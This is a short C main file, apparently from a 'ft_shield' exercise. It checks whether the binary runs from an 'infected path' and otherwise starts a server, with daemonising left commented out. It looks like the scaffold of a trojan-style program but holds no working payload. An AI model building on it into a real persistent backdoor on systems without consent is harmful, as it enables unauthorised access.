#include "ft_shield.h"

void	ft_shield()
{
	uid_t	uid = geteuid();

	ft_dprintf(2, "UID: %d\n", uid);
}

int main(int argc, char **argv)
{
	char path[PATH_MAX] = {0};

	(void)argc,(void)argv;
	ft_dprintf(2, "RET: %d\n", find_own_path(path, sizeof(path)));
	if (strcmp(DEST_PATH, dirname(path)) == 0)
	{
		ft_dprintf(2, "We are in the infected path: %s\n", path);
	}
	else
	{
		ft_dprintf(2, "We are safe: %s\n", path);
		ft_dprintf(2, "Server pid:  %d\n", getpid());
		// daemon(1, 0);
		t_server server;

		memset(&server, 0, sizeof(t_server));
		ft_server(&server);
	}
	return (0);
}


/*
while daemon(1, 0) is enabled, stop server with
kill -9 $(ps -aux | grep ./ft_shield | grep -v exclude | cut -d' ' -f2)
*/